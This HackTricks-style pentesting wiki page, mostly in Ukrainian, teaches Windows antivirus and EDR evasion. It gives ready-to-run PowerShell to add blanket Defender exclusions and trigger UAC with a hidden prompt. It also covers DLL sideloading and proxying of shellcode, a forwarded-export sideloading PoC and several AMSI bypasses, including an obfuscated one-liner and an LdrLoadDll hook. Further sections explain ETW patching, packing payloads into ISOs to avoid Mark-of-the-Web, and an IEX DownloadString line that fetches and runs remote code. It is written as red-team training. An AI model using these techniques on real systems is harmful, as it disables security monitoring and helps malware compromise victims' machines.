# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**Цю сторінку спочатку написав** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Stop Defender

- [defendnot](https://github.com/es3n1n/defendnot): Інструмент, щоб зупинити роботу Windows Defender.
- [no-defender](https://github.com/es3n1n/no-defender): Інструмент, щоб зупинити роботу Windows Defender, імітуючи інший AV.
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

### Installer-style UAC bait before tampering with Defender

Public loaders, що маскуються під game cheats, часто постачаються як unsigned Node.js/Nexe installers, які спочатку **просять користувача надати elevation**, а вже потім нейтралізують Defender. Потік простий:

1. Перевірити наявність адміністративного контексту за допомогою `net session`. Команда успішно виконується лише тоді, коли викликач має admin rights, тож збій означає, що loader запущений як standard user.
2. Негайно перезапустити себе з verb `RunAs`, щоб викликати очікуване UAC consent prompt, зберігаючи початковий command line.
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
Жертви вже вважають, що вони встановлюють “cracked” software, тож prompt зазвичай приймається, надаючи malware права, які йому потрібні, щоб змінити policy Defender.

### Blanket `MpPreference` exclusions for every drive letter

Після підвищення привілеїв chains у стилі GachiLoader максимізують blind spots Defender замість того, щоб повністю вимикати service. Loader спочатку вбиває GUI watchdog (`taskkill /F /IM SecHealthUI.exe`), а потім застосовує **надзвичайно широкі exclusions**, щоб кожен user profile, system directory і removable disk став unscannable:
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
Ключові спостереження:

- Цикл проходить по кожній змонтованій файловій системі (D:\, E:\, USB sticks тощо), тож **будь-який майбутній payload, скинутий будь-де на диску, ігнорується**.
- Виключення для розширення `.sys` має перспективний характер — attackers залишають собі можливість пізніше завантажувати unsigned drivers без повторного втручання в Defender.
- Усі зміни потрапляють до `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, що дає змогу пізнішим етапам перевірити, що exclusions зберігаються, або розширити їх без повторного спрацювання UAC.

Оскільки службу Defender не зупиняють, наївні health checks і далі показують “antivirus active”, хоча real-time inspection насправді ніколи не торкається цих шляхів.

## **AV Evasion Methodology**

Наразі AVs використовують різні методи для перевірки, чи є файл malicious, чи ні: static detection, dynamic analysis, а для більш просунутих EDRs — behavioural analysis.

### **Static detection**

Static detection досягається шляхом позначення відомих malicious strings або масивів байтів у binary чи script, а також шляхом вилучення інформації безпосередньо з файлу (наприклад, file description, company name, digital signatures, icon, checksum тощо). Це означає, що використання відомих public tools може частіше вас видати, оскільки їх, ймовірно, вже проаналізували та позначили як malicious. Є кілька способів обійти такий тип detection:

- **Encryption**

Якщо зашифрувати binary, AV не зможе виявити вашу program, але вам знадобиться якийсь loader, щоб розшифрувати й запустити program у memory.

- **Obfuscation**

Іноді достатньо просто змінити кілька strings у binary чи script, щоб провести його повз AV, але це може бути трудомісткою задачею залежно від того, що саме ви намагаєтеся obfuscate.

- **Custom tooling**

Якщо ви розробите власні tools, не буде відомих bad signatures, але це потребує багато часу та зусиль.

> [!TIP]
> Гарний спосіб перевірити static detection у Windows Defender — це [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). По суті, він ділить файл на кілька сегментів і змушує Defender сканувати кожен окремо; так він може точно показати, які strings або bytes у вашому binary позначені.

Дуже рекомендую переглянути цю [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) про практичний AV Evasion.

### **Dynamic analysis**

Dynamic analysis — це коли AV запускає ваш binary у sandbox і відстежує malicious activity (наприклад, спроби розшифрувати й прочитати паролі вашого browser, виконати minidump на LSASS тощо). З цим може бути трохи складніше працювати, але ось кілька речей, які можна зробити, щоб обійти sandboxes.

- **Sleep before execution** Залежно від реалізації, це може бути чудовим способом обійти dynamic analysis AV. AV мають дуже мало часу для сканування файлів, щоб не заважати робочому процесу користувача, тому довгі sleep можуть порушувати аналіз binaries. Проблема в тому, що багато sandboxes AV можуть просто пропускати sleep залежно від того, як це реалізовано.
- **Checking machine's resources** Зазвичай у sandboxes дуже мало ресурсів (наприклад, < 2GB RAM), інакше вони могли б уповільнювати машину користувача. Тут також можна проявити креативність, наприклад перевіряти температуру CPU або навіть швидкість вентиляторів — не все буде реалізовано в sandbox.
- **Machine-specific checks** Якщо ви хочете націлитися на user, чия workstation приєднана до домену "contoso.local", ви можете перевірити domain комп'ютера, щоб побачити, чи збігається він із вказаним вами; якщо ні, ви можете завершити program.

Виявляється, що ім'я комп'ютера в Sandbox Microsoft Defender — HAL9TH, тож ви можете перевірити computer name у своєму malware перед detonation; якщо ім'я збігається з HAL9TH, це означає, що ви всередині sandbox Defender, тож можете завершити program.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>source: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Ще кілька дуже хороших порад від [@mgeeky](https://twitter.com/mariuszbit) для протидії Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Як ми вже казали раніше в цьому post, **public tools** зрештою **будуть виявлені**, тож вам слід поставити собі запитання:

Наприклад, якщо ви хочете dump LSASS, **чи справді вам потрібно використовувати mimikatz**? Чи можна скористатися іншим project, який менш відомий і також робить dump LSASS.

Правильна відповідь, імовірно, другий варіант. Якщо брати mimikatz як приклад, це, мабуть, один із найбільш, якщо не найбільш, позначених malware серед AVs та EDRs; сам project дуже крутий, але працювати з ним для обходу AV — справжній nightmare, тож просто шукайте alternatives для того, чого ви намагаєтеся досягти.

> [!TIP]
> Під час модифікації ваших payloads для evasion переконайтеся, що ви **вимкнули automatic sample submission** у Defender, і, серйозно, **НЕ ЗАВАНТАЖУЙТЕ В VIRUSTOTAL**, якщо ваша мета — досягти evasion у довгостроковій перспективі. Якщо ви хочете перевірити, чи ваш payload виявляється певним AV, встановіть його у VM, спробуйте вимкнути automatic sample submission і тестуйте там, доки не будете задоволені результатом.

## EXEs vs DLLs

Щоразу, коли це можливо, завжди **надавайте пріоритет використанню DLLs для evasion**; з мого досвіду, файли DLL зазвичай **набагато менше виявляються** і аналізуються, тож це дуже простий трюк, який можна використати, щоб уникнути detection у деяких випадках (якщо ваш payload, звісно, має спосіб запускатися як DLL).

Як бачимо на цьому зображенні, DLL Payload від Havoc має detection rate 4/26 в antiscan.me, тоді як EXE payload має detection rate 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me comparison of a normal Havoc EXE payload vs a normal Havoc DLL</p></figcaption></figure>

Тепер покажемо кілька трюків, які можна використовувати з файлами DLL, щоб бути значно stealthier.

## DLL Sideloading & Proxying

**DLL Sideloading** використовує порядок пошуку DLL, який застосовує loader, розміщуючи victim application і malicious payload(s) поруч один з одним.

Перевірити програми, вразливі до DLL Sideloading, можна за допомогою [Siofra](https://github.com/Cybereason/siofra) і наведеного нижче powershell script:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Ця команда виведе список програм, вразливих до DLL hijacking всередині "C:\Program Files\\" та DLL-файли, які вони намагаються завантажити.

Я дуже рекомендую вам **самостійно досліджувати програми, які можна DLL Hijack/Sideload**, ця техніка доволі stealthy, якщо зробити все правильно, але якщо ви використаєте публічно відомі DLL Sideloadable програми, вас можуть легко спіймати.

Просто помістивши malicious DLL із назвою, яку програма очікує завантажити, ви не завантажите свій payload, оскільки програма очікує певні конкретні functions всередині цієї DLL; щоб виправити цю проблему, ми використаємо іншу техніку під назвою **DLL Proxying/Forwarding**.

**DLL Proxying** forward-ить виклики, які програма робить з proxy (і malicious) DLL до оригінальної DLL, тим самим зберігаючи функціональність програми та даючи змогу обробити виконання вашого payload.

Я використовуватиму проєкт [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) від [@flangvik](https://twitter.com/Flangvik/)

Ось кроки, які я виконав:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Остання команда надасть нам 2 файли: шаблон вихідного коду DLL і оригінальну перейменовану DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
These are the results:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

І наш shellcode (encoded with [SGN](https://github.com/EgeBalci/sgn)), і proxy DLL мають 0/26 Detection rate в [antiscan.me](https://antiscan.me)! Я б назвав це успіхом.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Я **дуже рекомендую** подивитися [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) про DLL Sideloading, а також [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE), щоб дізнатися більше про те, що ми обговорили більш детально.

### Abusing Forwarded Exports (ForwardSideLoading)

Windows PE modules можуть export functions, які насправді є "forwarders": замість вказівки на code, запис export містить ASCII string у форматі `TargetDll.TargetFunc`. Коли caller резолвить export, Windows loader буде:

- Load `TargetDll`, якщо ще не завантажений
- Resolve `TargetFunc` з нього

Ключові behaviors, які треба розуміти:
- Якщо `TargetDll` є KnownDLL, він постачається з захищеного KnownDLLs namespace (наприклад, ntdll, kernelbase, ole32).
- Якщо `TargetDll` не є KnownDLL, використовується звичайний DLL search order, який включає directory модуля, що виконує forward resolution.

Це дозволяє непрямий sideloading primitive: знайдіть signed DLL, яка export-ить function, forwarded до non-KnownDLL module name, а потім розмістіть цю signed DLL поруч з DLL під контролем attacker, названою точно так само, як forwarded target module. Коли forwarded export викликається, loader резолвить forward і завантажує вашу DLL з тієї ж directory, виконуючи ваш DllMain.

Example observed on Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` не є KnownDLL, тому він визначається через звичайний порядок пошуку.

PoC (copy-paste):
1) Скопіюйте підписаний системний DLL у папку з можливістю запису
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Скинь malicious `NCRYPTPROV.dll` у ту саму папку. Мінімального DllMain достатньо, щоб отримати виконання коду; не потрібно реалізовувати forwarded function, щоб спрацював DllMain.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Спробуйте форвард з підписаним LOLBin:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Спостережувана поведінка:
- rundll32 (signed) завантажує side-by-side `keyiso.dll` (signed)
- Під час розв’язання `KeyIsoSetAuditingInterface`, loader переходить за forward до `NCRYPTPROV.SetAuditingInterface`
- Потім loader завантажує `NCRYPTPROV.dll` з `C:\test` і виконує його `DllMain`
- Якщо `SetAuditingInterface` не реалізовано, ви отримаєте помилку "missing API" лише після того, як `DllMain` уже спрацював

Поради для hunting:
- Зосередьтеся на forwarded exports, де цільовий module не є KnownDLL. KnownDLLs перелічені в `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Ви можете перерахувати forwarded exports за допомогою tooling, наприклад:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Дивіться Windows 11 forwarder inventory, щоб шукати candidates: https://hexacorn.com/d/apis_fwd.txt

Detection/defense ideas:
- Monitor LOLBins (e.g., rundll32.exe), що завантажують signed DLLs з non-system paths, а потім завантажують non-KnownDLLs з тим самим base name з цього каталогу
- Alert on process/module chains like: `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll` під user-writable paths
- Enforce code integrity policies (WDAC/AppLocker) і deny write+execute в application directories

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

You can use Freeze to load and execute your shellcode in a stealthy manner.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion — це просто гра в кішки-мишки, те, що працює сьогодні, завтра може бути виявлено, тож ніколи не покладайтесь лише на один tool; якщо можливо, спробуйте об’єднувати multiple evasion techniques.

## Direct/Indirect Syscalls & SSN Resolution (SysWhispers4)

EDR часто розміщують **user-mode inline hooks** на syscall stubs у `ntdll.dll`. Щоб обійти ці hooks, можна згенерувати **direct** або **indirect** syscall stubs, які завантажують правильний **SSN** (System Service Number) і переходять у kernel mode, не виконуючи hooked export entrypoint.

**Invocation options:**
- **Direct (embedded)**: вставляє інструкцію `syscall`/`sysenter`/`SVC #0` у згенерований stub (без звернення до `ntdll` export).
- **Indirect**: стрибає в наявний `syscall` gadget всередині `ntdll`, щоб kernel transition виглядав таким, ніби він походить з `ntdll` (корисно для heuristic evasion); **randomized indirect** обирає gadget з pool для кожного виклику.
- **Egg-hunt**: уникає вбудовування статичної послідовності opcode `0F 05` на диску; розв’язує syscall sequence під час runtime.

**Hook-resistant SSN resolution strategies:**
- **FreshyCalls (VA sort)**: визначає SSN, сортувавши syscall stubs за virtual address, замість читання байтів stub.
- **SyscallsFromDisk**: монтує чистий `\KnownDlls\ntdll.dll`, читає SSN з його `.text`, потім unmap (обходить усі in-memory hooks).
- **RecycledGate**: поєднує VA-sorted SSN inference з перевіркою opcode, коли stub clean; переходить до VA inference, якщо він hooked.
- **HW Breakpoint**: встановлює DR0 на інструкцію `syscall` і використовує VEH, щоб захопити SSN з `EAX` під час runtime, без парсингу hooked bytes.

Example SysWhispers4 usage:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```
## AMSI (Anti-Malware Scan Interface)

AMSI було створено, щоб запобігати "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Спочатку AV могли сканувати лише **файли на диску**, тож якщо ви якось могли виконувати payloads **безпосередньо в пам’яті**, AV нічого не міг би зробити, щоб цьому запобігти, оскільки не мав достатньої видимості.

Функцію AMSI інтегровано в ці компоненти Windows.

- User Account Control, або UAC (elevation of EXE, COM, MSI, or ActiveX installation)
- PowerShell (scripts, interactive use, and dynamic code evaluation)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

Вона дозволяє antivirus solutions інспектувати поведінку script, розкриваючи вміст script у формі, що є одночасно незашифрованою та необфускованою.

Запуск `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` згенерує таке попередження в Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Зверніть увагу, що він додає префікс `amsi:`, а потім шлях до executable, з якого було запущено script; у цьому випадку, powershell.exe

Ми не скидали жодного file на диск, але все одно були виявлені в memory через AMSI.

Більше того, починаючи з **.NET 4.8**, code C# також проходить через AMSI. Це навіть впливає на `Assembly.Load(byte[])` для завантаження execution in-memory. Саме тому для execution in-memory, якщо ви хочете evade AMSI, рекомендовано використовувати нижчі версії .NET (наприклад, 4.7.2 або нижче).

Існує кілька способів обійти AMSI:

- **Obfuscation**

Оскільки AMSI головним чином працює зі static detections, модифікація scripts, які ви намагаєтеся завантажити, може бути хорошим способом evade detection.

Однак AMSI має можливість unobfuscating scripts навіть якщо вони мають кілька шарів, тож obfuscation може бути поганим варіантом залежно від того, як саме це зроблено. Це робить evade не таким уже й простим. Хоча іноді все, що потрібно, — це змінити кілька назв variables, і цього буде достатньо, тож усе залежить від того, наскільки щось було flagged.

- **AMSI Bypass**

Оскільки AMSI реалізовано шляхом завантаження DLL у процес powershell (також cscript.exe, wscript.exe, etc.), його можна легко tamper even running as an unprivileged user. Через цю ваду в реалізації AMSI дослідники знайшли кілька способів evade AMSI scanning.

**Forcing an Error**

Примусове збоєння ініціалізації AMSI (amsiInitFailed) призведе до того, що для поточного процесу не буде ініційовано жодного scan. Спочатку це було disclosed by [Matt Graeber](https://twitter.com/mattifestation), а Microsoft розробила signature, щоб запобігти ширшому використанню.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Усе, що знадобилося, — це один рядок коду powershell, щоб зробити AMSI непридатним для поточного powershell процесу. Цей рядок, звісно, був позначений самим AMSI, тож потрібна певна модифікація, щоб використати цю техніку.

Ось модифікований AMSI bypass, який я взяв із цього [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Keep in mind, that this will probably get flagged once this post comes out, so you should not publish any code if your plan is staying undetected.

**Memory Patching**

This technique was initially discovered by [@RastaMouse](https://twitter.com/_RastaMouse/) and it involves finding address for the "AmsiScanBuffer" function in amsi.dll (responsible for scanning the user-supplied input) and overwriting it with instructions to return the code for E_INVALIDARG, this way, the result of the actual scan will return 0, which is interpreted as a clean result.

> [!TIP]
> Please read [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) for a more detailed explanation.

There are also many other techniques used to bypass AMSI with powershell, check out [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) and [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) to learn more about them.

### Blocking AMSI by preventing amsi.dll load (LdrLoadDll hook)

AMSI is initialised only after `amsi.dll` is loaded into the current process. A robust, language‑agnostic bypass is to place a user‑mode hook on `ntdll!LdrLoadDll` that returns an error when the requested module is `amsi.dll`. As a result, AMSI never loads and no scans occur for that process.

Implementation outline (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Notes
- Works across PowerShell, WScript/CScript and custom loaders alike (anything that would otherwise load AMSI).
- Pair with feeding scripts over stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) to avoid long command‑line artefacts.
- Seen used by loaders executed through LOLBins (e.g., `regsvr32` calling `DllRegisterServer`).

The tool **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** also generates script to bypass AMSI.
The tool **[https://amsibypass.com/](https://amsibypass.com/)** also generates script to bypass AMSI that avoid signature by randomized user-defined function, variables, characters expression and applies random character casing to PowerShell keywords to avoid signature.

**Remove the detected signature**

You can use a tool such as **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** and **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** to remove the detected AMSI signature from the memory of the current process. This tool works by scanning the memory of the current process for the AMSI signature and then overwriting it with NOP instructions, effectively removing it from memory.

**AV/EDR products that uses AMSI**

You can find a list of AV/EDR products that uses AMSI in **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Use Powershell version 2**
If you use PowerShell version 2, AMSI will not be loaded, so you can run your scripts without being scanned by AMSI. You can do this:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging — це функція, яка дозволяє журналювати всі команди PowerShell, виконані в системі. Це може бути корисним для аудиту та усунення неполадок, але також може бути **проблемою для атакувальників, які хочуть уникнути виявлення**.

Щоб обійти PowerShell logging, ви можете використати такі техніки:

- **Disable PowerShell Transcription and Module Logging**: Для цього можна використати інструмент на кшталт [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs).
- **Use Powershell version 2**: Якщо ви використовуєте PowerShell version 2, AMSI не буде завантажено, тож ви зможете запускати свої скрипти без сканування AMSI. Ви можете зробити так: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: Використайте [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell), щоб створити powershell без захистів (саме це використовує `powerpick` з Cobal Strike).


## Obfuscation

> [!TIP]
> Several obfuscation techniques relies on encrypting data, which will increase the entropy of the binary which will make easier for AVs and EDRs to detect it. Be careful with this and maybe only apply encryption to specific sections of your code that is sensitive or needs to be hidden.

### Deobfuscating ConfuserEx-Protected .NET Binaries

When analysing malware that uses ConfuserEx 2 (or commercial forks) it is common to face several layers of protection that will block decompilers and sandboxes.  The workflow below reliably **restores a near–original IL** that can afterwards be decompiled to C# in tools such as dnSpy or ILSpy.

1.  Anti-tampering removal – ConfuserEx encrypts every *method body* and decrypts it inside the *module* static constructor (`<Module>.cctor`).  This also patches the PE checksum so any modification will crash the binary.  Use **AntiTamperKiller** to locate the encrypted metadata tables, recover the XOR keys and rewrite a clean assembly:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Output contains the 6 anti-tamper parameters (`key0-key3`, `nameHash`, `internKey`) that can be useful when building your own unpacker.

2.  Symbol / control-flow recovery – feed the *clean* file to **de4dot-cex** (a ConfuserEx-aware fork of de4dot).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – select the ConfuserEx 2 profile
• de4dot will undo control-flow flattening, restore original namespaces, classes and variable names and decrypt constant strings.

3.  Proxy-call stripping – ConfuserEx replaces direct method calls with lightweight wrappers (a.k.a *proxy calls*) to further break decompilation.  Remove them with **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
After this step you should observe normal .NET API such as `Convert.FromBase64String` or `AES.Create()` instead of opaque wrapper functions (`Class8.smethod_10`, …).

4.  Manual clean-up – run the resulting binary under dnSpy, search for large Base64 blobs or `RijndaelManaged`/`TripleDESCryptoServiceProvider` use to locate the *real* payload.  Often the malware stores it as a TLV-encoded byte array initialised inside `<Module>.byte_0`.

The above chain restores execution flow **without** needing to run the malicious sample – useful when working on an offline workstation.

> 🛈  ConfuserEx produces a custom attribute named `ConfusedByAttribute` that can be used as an IOC to automatically triage samples.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Мета цього проєкту — надати open-source fork [LLVM](http://www.llvm.org/) compilation suite, здатний забезпечити підвищену безпеку software через [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) і tamper-proofing.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator демонструє, як використовувати `C++11/14` language для генерації під час компіляції obfuscated code без використання будь-яких external tool і без модифікації compiler.
- [**obfy**](https://github.com/fritzone/obfy): Додає шар obfuscated operations, згенерованих C++ template metaprogramming framework, який ускладнить життя людині, що хоче crack application.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz — це x64 binary obfuscator, який здатний obfuscate різні PE files, зокрема: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame — це простий metamorphic code engine для arbitrary executables.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator — це framework для fine-grained code obfuscation для мов, які підтримує LLVM, using ROP (return-oriented programming). ROPfuscator obfuscates program на assembly code level, перетворюючи звичайні instructions на ROP chains, і руйнує наше природне уявлення про normal control flow.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt — це .NET PE Crypter, написаний у Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor може convert existing EXE/DLL into shellcode and then load them

## SmartScreen & MoTW

Ви могли бачити цей screen під час downloading деяких executables з internet і executing them.

Microsoft Defender SmartScreen — це security mechanism, призначений для захисту end user від запуску potentially malicious applications.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen mainly works with a reputation-based approach, meaning that uncommonly download applications will trigger SmartScreen thus alerting and preventing the end user from executing the file (although the file can still be executed by clicking More Info -> Run anyway).

**MoTW** (Mark of The Web) — це [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) з назвою Zone.Identifier, який автоматично створюється під час download files from the internet, разом із URL, звідки його було downloaded.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Checking the Zone.Identifier ADS for a file downloaded from the internet.</p></figcaption></figure>

> [!TIP]
> Важливо зазначити, що executables, підписані **trusted** signing certificate, **won't trigger SmartScreen**.

Дуже ефективний спосіб запобігти тому, щоб ваші payloads отримували Mark of The Web, — пакувати їх усередині якогось container, наприклад ISO. Це відбувається тому, що Mark-of-the-Web (MOTW) **cannot** be applied to **non NTFS** volumes.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) — це tool, який пакує payloads в output containers, щоб evade Mark-of-the-Web.

Example usage:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Ось демо обходу SmartScreen шляхом упаковки payloads всередину ISO-файлів за допомогою [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) — це потужний механізм логування в Windows, який дозволяє applications і system components **log events**. However, it can also be used by security products to monitor and detect malicious activities.

Подібно до того, як AMSI відключається (bypassed), також можна змусити функцію **`EtwEventWrite`** у user space process негайно повертати результат без логування будь-яких events. Це робиться шляхом patching функції в пам’яті так, щоб вона одразу повертала результат, фактично вимикаючи ETW logging для цього process.

